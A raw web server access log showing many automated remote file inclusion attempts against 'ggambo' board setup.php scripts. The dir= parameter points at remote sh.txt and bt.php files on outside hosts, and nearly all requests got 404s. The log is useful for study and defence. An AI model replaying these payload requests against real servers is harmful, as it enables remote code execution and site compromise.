203.58.0.155 - - [14/Feb/2015:12:41:41 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
112.218.68.155 - - [14/Feb/2015:12:41:41 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)" 
112.218.68.155 - - [14/Feb/2015:12:41:42 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)" 
203.58.0.155 - - [14/Feb/2015:12:41:42 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
203.58.0.155 - - [14/Feb/2015:12:41:42 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
203.58.0.155 - - [14/Feb/2015:12:41:43 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
203.58.0.155 - - [14/Feb/2015:12:41:44 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
203.58.0.155 - - [14/Feb/2015:12:41:44 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
203.58.0.155 - - [14/Feb/2015:12:41:44 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
203.58.0.155 - - [14/Feb/2015:12:41:46 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
1.224.163.80 - - [14/Feb/2015:12:41:49 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
1.224.163.80 - - [14/Feb/2015:12:41:49 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [14/Feb/2015:12:41:50 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
1.224.163.80 - - [14/Feb/2015:12:41:50 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [14/Feb/2015:12:41:51 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
1.224.163.80 - - [14/Feb/2015:12:41:51 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [14/Feb/2015:12:41:51 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [14/Feb/2015:12:41:52 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
1.224.163.80 - - [14/Feb/2015:12:41:52 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
1.224.163.80 - - [14/Feb/2015:12:41:52 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [14/Feb/2015:12:41:53 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
49.50.76.8 - - [14/Feb/2015:12:41:53 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
1.224.163.80 - - [14/Feb/2015:12:41:53 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [14/Feb/2015:12:41:53 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
203.58.0.155 - - [14/Feb/2015:12:41:53 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
1.224.163.80 - - [14/Feb/2015:12:41:54 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [14/Feb/2015:12:41:54 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [14/Feb/2015:12:41:54 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
1.224.163.80 - - [14/Feb/2015:12:41:55 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
49.50.76.8 - - [14/Feb/2015:12:41:55 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
203.58.0.155 - - [14/Feb/2015:12:41:55 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
1.224.163.80 - - [14/Feb/2015:12:41:55 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
49.50.76.8 - - [14/Feb/2015:12:41:55 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
203.58.0.155 - - [14/Feb/2015:12:41:55 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
203.58.0.155 - - [14/Feb/2015:12:41:55 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
1.224.163.80 - - [14/Feb/2015:12:41:56 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
203.58.0.155 - - [14/Feb/2015:12:41:56 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
1.224.163.80 - - [14/Feb/2015:12:41:56 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
49.50.76.8 - - [14/Feb/2015:12:41:57 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
49.50.76.8 - - [14/Feb/2015:12:41:57 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
203.58.0.155 - - [14/Feb/2015:12:41:57 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
203.58.0.155 - - [14/Feb/2015:12:41:57 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
203.58.0.155 - - [14/Feb/2015:12:41:58 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
203.58.0.155 - - [14/Feb/2015:12:41:58 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
203.58.0.155 - - [14/Feb/2015:12:41:58 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
203.58.0.155 - - [14/Feb/2015:12:41:58 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
49.50.76.8 - - [14/Feb/2015:12:41:58 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
203.58.0.155 - - [14/Feb/2015:12:41:59 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
203.58.0.155 - - [14/Feb/2015:12:41:59 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
203.58.0.155 - - [14/Feb/2015:12:42:00 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
203.58.0.155 - - [14/Feb/2015:12:42:00 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
203.58.0.155 - - [14/Feb/2015:12:42:01 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
49.50.76.8 - - [14/Feb/2015:12:42:03 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
1.224.163.80 - - [14/Feb/2015:12:42:03 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
181.65.186.35 - - [14/Feb/2015:12:42:04 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
1.224.163.80 - - [14/Feb/2015:12:42:04 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
181.65.186.35 - - [14/Feb/2015:12:42:04 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
49.50.76.8 - - [14/Feb/2015:12:42:04 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
49.50.76.8 - - [14/Feb/2015:12:42:05 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
1.224.163.80 - - [14/Feb/2015:12:42:05 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
49.50.76.8 - - [14/Feb/2015:12:42:05 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
181.65.186.35 - - [14/Feb/2015:12:42:05 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
181.65.186.35 - - [14/Feb/2015:12:42:05 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
1.224.163.80 - - [14/Feb/2015:12:42:05 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
1.224.163.80 - - [14/Feb/2015:12:42:06 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
181.65.186.35 - - [14/Feb/2015:12:42:06 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
181.65.186.35 - - [14/Feb/2015:12:42:06 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
49.50.76.8 - - [14/Feb/2015:12:42:06 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
1.224.163.80 - - [14/Feb/2015:12:42:06 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [14/Feb/2015:12:42:07 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
181.65.186.35 - - [14/Feb/2015:12:42:07 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
49.50.76.8 - - [14/Feb/2015:12:42:07 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
181.65.186.35 - - [14/Feb/2015:12:42:07 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
1.224.163.80 - - [14/Feb/2015:12:42:08 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [14/Feb/2015:12:42:10 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
212.227.18.39 - - [14/Feb/2015:12:42:11 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 418 695 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" 
1.224.163.80 - - [14/Feb/2015:12:42:11 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [14/Feb/2015:12:42:11 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [14/Feb/2015:12:42:11 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
212.227.18.39 - - [14/Feb/2015:12:42:12 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 418 695 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" 
212.227.18.39 - - [14/Feb/2015:12:42:12 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 418 695 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" 
1.224.163.80 - - [14/Feb/2015:12:42:12 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
49.50.76.8 - - [14/Feb/2015:12:42:12 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
1.224.163.80 - - [14/Feb/2015:12:42:13 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [14/Feb/2015:12:42:13 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
212.227.18.39 - - [14/Feb/2015:12:42:14 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 418 695 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" 
49.50.76.8 - - [14/Feb/2015:12:42:14 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
1.224.163.80 - - [14/Feb/2015:12:42:14 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
49.50.76.8 - - [14/Feb/2015:12:42:15 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
49.50.76.8 - - [14/Feb/2015:12:42:16 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
180.179.212.185 - - [14/Feb/2015:12:42:23 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
180.179.212.185 - - [14/Feb/2015:12:42:25 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
180.179.212.185 - - [14/Feb/2015:12:42:26 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
180.179.212.185 - - [14/Feb/2015:12:42:27 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
180.179.212.185 - - [14/Feb/2015:12:42:28 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
180.179.212.185 - - [14/Feb/2015:12:42:30 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
180.179.212.185 - - [14/Feb/2015:12:42:30 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
180.179.212.185 - - [14/Feb/2015:12:42:32 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
211.47.181.38 - - [14/Feb/2015:12:42:44 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
211.47.181.38 - - [14/Feb/2015:12:42:45 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
211.47.181.38 - - [14/Feb/2015:12:42:45 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
211.47.181.38 - - [14/Feb/2015:12:42:47 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
91.121.6.123 - - [14/Feb/2015:12:42:53 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051219 SeaMonkey/1.0b" 
91.121.6.123 - - [14/Feb/2015:12:42:54 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051219 SeaMonkey/1.0b" 
80.68.145.110 - - [14/Feb/2015:12:44:06 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
80.68.145.110 - - [14/Feb/2015:12:44:07 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
80.68.145.110 - - [14/Feb/2015:12:44:07 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
80.68.145.110 - - [14/Feb/2015:12:44:08 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
80.68.145.110 - - [14/Feb/2015:12:44:09 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
80.68.145.110 - - [14/Feb/2015:12:44:09 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
